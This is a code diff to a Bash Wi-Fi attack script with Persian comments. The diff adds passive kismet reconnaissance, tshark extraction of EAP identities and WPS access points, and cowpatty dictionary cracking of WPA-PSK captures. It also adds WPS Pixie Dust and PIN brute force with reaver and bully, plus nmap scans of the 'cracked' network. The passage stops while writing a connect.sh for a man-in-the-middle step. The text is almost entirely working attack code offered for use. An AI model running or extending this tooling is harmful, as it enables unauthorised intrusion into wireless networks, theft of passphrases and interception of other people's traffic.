@@ -155,6 +155,15 @@ if [ "$PROFILE" = stealth ]; then
   ok "MAC رندوم شد."
 fi
 
+# ---------- فاز ۰.۵: شناسایی منفعل (kismet) ----------
+if command -v kismet >/dev/null 2>&1; then
+  hr; c "فاز ۰.۵ — شناسایی منفعل با kismet"
+  timeout 30 kismet -c "$MON" --daemonize 2>/dev/null || true
+  sleep 10
+  pkill -f kismet 2>/dev/null || true
+  ok "شناسایی منفعل کامل شد."
+fi
+
 # ---------- فاز ۱: برداشت ----------
 hr; c "فاز ۱ — برداشت PMKID + EAPOL + EAP برای ${CAPTURE} ثانیه"
 HDR=$(hcxdumptool --help 2>&1 || true)
@@ -187,6 +196,15 @@ if [ -s "$CAP" ]; then
   ok "برداشت: $(du -h "$CAP" | cut -f1)"
 else
   err "هیچ داده‌ای گرفته نشد."; exit 1
+fi
+
+# tshark: تحلیل بسته‌ها برای شناسایی Enterprise/WPS/کلاینت‌ها
+if command -v tshark >/dev/null 2>&1; then
+  c "  → tshark تحلیل بسته‌ها"
+  tshark -r "$CAP" -Y 'eap' -T fields -e wlan.sa -e eap.identity 2>/dev/null | sort -u > "$WORK/eap-idents.txt"
+  tshark -r "$CAP" -Y 'wps' -T fields -e wlan.bssid 2>/dev/null | sort -u > "$WORK/wps-bssids.txt"
+  [ -s "$WORK/eap-idents.txt" ] && ok "EAP identities: $(wc -l < "$WORK/eap-idents.txt")"
+  [ -s "$WORK/wps-bssids.txt" ] && ok "WPS BSSIDs: $(wc -l < "$WORK/wps-bssids.txt")"
 fi
 
 # ---------- فاز ۲: نرمال‌سازی ----------
@@ -252,6 +270,18 @@ for f in "$DICTDIR"/rockyou.txt "$DICTDIR"/weakpass*.txt "$DICTDIR"/hashmob*.txt
 done
 [ ${#WORDLISTS[@]} -eq 0 ] && { warn "هیچ وردلیستی نبود؛ فقط ماسک اجرا می‌شود."; WORDLISTS=("$WORK/dicts/vendor.txt"); }
 
+# لایه ۰: cowpatty (حملهٔ سریع دیکشنری WPA-PSK)
+if command -v cowpatty >/dev/null && [ -s "$HASH" ]; then
+  c "  → cowpatty (حملهٔ سریع)"
+  for w in "${WORDLISTS[@]}"; do
+    [ -f "$w" ] || continue
+    cowpatty -r "$CAP" -f "$w" -s "$(head -1 "$WORK/essids.txt" 2>/dev/null)" > "$WORK/cowpatty.txt" 2>&1
+    grep -i 'The PSK is' "$WORK/cowpatty.txt" 2>/dev/null | sed 's/.*The PSK is "//;s/".*//' | while read -r pw; do
+      [ -n "$pw" ] && echo "cowpatty|$pw|$(head -1 "$WORK/essids.txt")" >> "$WORK/cracked.txt"
+    done
+  done
+fi
+
 # لایه ۱: دیکشنری مشتق از SSID + پیش‌فرض وندور
 run_hc "دیکشنری SSID/وندور" -a 0 "$WORK/dicts/vendor.txt"
 
@@ -295,18 +325,42 @@ if [ -s "$WORK/mschapv2.txt" ]; then
     >> "$WORK/enterprise-cracked.txt"
 fi
 
-# ---------- فاز ۴: WPS Pixie Dust ----------
-if [ "$DO_WPS" -eq 1 ] && command -v reaver >/dev/null && [ -f "$WORK/scan-01.csv" ]; then
-  hr; c "فاز ۴ — WPS Pixie Dust"
-  awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x); c=$4; gsub(/ /,"",c); print x, c}' \
-    "$WORK/scan-01.csv" | sort -u > "$WORK/wps-cands.txt"
+# ---------- فاز ۴: WPS Pixie Dust + Brute ----------
+if [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; then
+  hr; c "فاز ۴ — WPS (Pixie Dust + Brute)"
+  # wash: اسکن دقیق WPS-enabled APها (بهتر از parsing CSV)
+  if command -v wash >/dev/null 2>&1; then
+    wash -i "$MON" -o "$WORK/wps-scan.txt" 2>/dev/null &
+    WASH_PID=$!
+    sleep 15
+    kill "$WASH_PID" 2>/dev/null; wait "$WASH_PID" 2>/dev/null
+    if [ -s "$WORK/wps-scan.txt" ]; then
+      awk '{print $1, $6}' "$WORK/wps-scan.txt" | sort -u > "$WORK/wps-cands.txt"
+    else
+      awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x); c=$4; gsub(/ /,"",c); print x, c}' \
+        "$WORK/scan-01.csv" | sort -u > "$WORK/wps-cands.txt"
+    fi
+  else
+    awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x); c=$4; gsub(/ /,"",c); print x, c}' \
+      "$WORK/scan-01.csv" | sort -u > "$WORK/wps-cands.txt"
+  fi
   while read -r b ch; do
     grep -q "$b" "$WORK/cracked.txt" 2>/dev/null && continue
     [ -z "$ch" ] && continue
-    c "  → reaver -K 1 روی $b"
-    timeout 240 reaver -i "$MON" -b "$b" -c "$ch" -K 1 -N -vv -d 5 > "$WORK/wps-$b.txt" 2>&1
-    k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-$b.txt")
-    [ -n "$k" ] && ok "WPS → $k" && echo "$b|$k|WPS" >> "$WORK/cracked.txt"
+    # reaver Pixie Dust
+    if command -v reaver >/dev/null 2>&1; then
+      c "  → reaver -K 1 روی $b"
+      timeout 240 reaver -i "$MON" -b "$b" -c "$ch" -K 1 -N -vv -d 5 > "$WORK/wps-$b.txt" 2>&1
+      k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-$b.txt")
+      [ -n "$k" ] && ok "WPS (reaver) → $k" && echo "$b|$k|WPS-reaver" >> "$WORK/cracked.txt" && continue
+    fi
+    # bully: brute-force PIN (alternative to reaver)
+    if command -v bully >/dev/null 2>&1; then
+      c "  → bully روی $b"
+      timeout 300 bully -b "$b" -c "$ch" -d "$WORK/bully-$b" "$MON" > "$WORK/bully-$b.txt" 2>&1
+      k=$(awk -F'WPA PSK: ' 'NF>1{print $2; exit}' "$WORK/bully-$b.txt" 2>/dev/null | head -1)
+      [ -n "$k" ] && ok "WPS (bully) → $k" && echo "$b|$k|WPS-bully" >> "$WORK/cracked.txt"
+    fi
   done < "$WORK/wps-cands.txt"
 fi
 
@@ -362,6 +416,13 @@ if [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
   hr; c "فاز ۶ — آماده‌سازی post-exploit"
   first=$(head -1 "$WORK/cracked.txt")
   b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
+  # nmap: اسکن شبکهٔ کرک‌شده برای شناسایی سرویس‌ها
+  if command -v nmap >/dev/null 2>&1; then
+    c "  → nmap اسکن شبکه"
+    nmap -sn 192.168.1.0/24 -oN "$REPORT/nmap-hosts.txt" 2>/dev/null || true
+    nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24 -oN "$REPORT/nmap-services.txt" 2>/dev/null || true
+    ok "نتایج nmap: $REPORT/nmap-hosts.txt"
+  fi
   cat > "$REPORT/connect.sh" <<EOF
 #!/usr/bin/env bash
 # اتصال به شبکه کرک‌شده و شروع MITM
